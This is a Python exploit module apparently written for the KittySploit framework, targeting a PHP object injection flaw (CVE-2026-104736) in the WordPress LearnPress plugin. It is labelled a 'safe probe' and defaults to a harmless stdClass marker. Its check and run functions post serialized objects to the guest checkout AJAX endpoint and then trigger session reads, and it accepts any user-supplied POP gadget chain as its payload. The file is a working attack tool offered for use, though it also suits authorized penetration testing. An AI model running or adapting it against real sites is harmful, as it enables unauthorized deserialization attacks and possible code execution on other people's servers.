#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""LearnPress CVE-2026-104736 — guest checkout PHP object injection (safe probe)."""

import secrets
from urllib.parse import quote

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "LearnPress CVE-2026-104736 PHP object injection probe",
        "description": (
            "Auxiliary for CVE-2026-104736: injects serialized data via lp-ajax=checkout and "
            "checkout-email, then triggers session reads. No shell/session — supply lab POP "
            "payloads via PAYLOAD when authorized."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-104736"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-104736",
            "https://github.com/murrez/CVE-2026-104736",
            "https://www.wordfence.com/threat-intel/vulnerabilities/id/3e28e008-0ec1-4262-9ac0-6170cf8b8bdf",
        ],
        "tags": ["wordpress", "learnpress", "deserialization", "php", "auxiliary", "cve-2026-104736"],
        "agent": {
            "risk": "high",
            "effects": ["active_exploitation"],
            "expected_requests": 4,
            "reversible": True,
            "approval_required": True,
            "produces": ["exploit_paths", "risk_signals"],
            "chain": {
                "suggested_followups": [
                    "scanner/http/learnpress_cve_2026_104736_detect",
                ],
            },
        },
    }

    path = OptString("/", "WordPress base path", required=False)
    payload = OptString(
        "",
        "URL-encoded or raw PHP serialized string (empty = harmless stdClass probe)",
        required=False,
    )
    gadget_expect = OptString(
        "",
        "Substring that must appear in checkout response to confirm gadget execution",
        required=False,
    )

    def _base(self) -> str:
        return self.wp_normalize_base_path(self.path or "/")

    def _join(self, suffix: str) -> str:
        root = self._base()
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{root}{suffix}" if root != "/" else suffix

    def _serialized_probe(self) -> str:
        custom = (self.payload or "").strip()
        if custom:
            if custom.startswith("O:") or custom.startswith("a:"):
                return quote(custom, safe="")
            return custom
        key = secrets.token_hex(2)
        return quote(f'O:8:"stdClass":1:{{s:4:"{key}";s:3:"poc";}}', safe="")

    def check(self):
        data = f"lp-ajax=checkout&checkout-email={self._serialized_probe()}"
        response = self.http_request(
            method="POST",
            path=self._join("/"),
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data=data,
            allow_redirects=False,
        )
        if not response or response.status_code != 200:
            return {"vulnerable": False, "reason": "No LP checkout AJAX response", "confidence": "low"}
        body = response.text or ""
        if "LP_AJAX_START" not in body:
            return {"vulnerable": False, "reason": "LearnPress AJAX wrapper missing", "confidence": "medium"}
        expect = (self.gadget_expect or "").strip()
        if expect and expect in body:
            return {"vulnerable": True, "reason": "Gadget marker in checkout response", "confidence": "high"}
        if "invalid_email" in body.lower():
            return {"vulnerable": False, "reason": "checkout-email rejected by sanitizer", "confidence": "medium"}
        return {"vulnerable": True, "reason": "LP checkout handler accepted inject probe", "confidence": "medium"}

    def run(self):
        chk = self.check()
        if not chk.get("vulnerable"):
            print_error(chk.get("reason"))
            return False
        inject = self.http_request(
            method="POST",
            path=self._join("/"),
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data=f"lp-ajax=checkout&checkout-email={self._serialized_probe()}",
            allow_redirects=False,
        )
        body = (inject.text or "")[:1200] if inject else ""
        print_status(f"Checkout AJAX preview: {body}")
        for trigger in ("/checkout/", "/"):
            self.http_request(method="GET", path=self._join(trigger), allow_redirects=True)
        expect = (self.gadget_expect or "").strip()
        if expect and expect in (inject.text or ""):
            print_success(f"Gadget expect matched: {expect}")
            return True
        print_success("Injection likely — verify session storage / lab POP chain for impact")
        return True
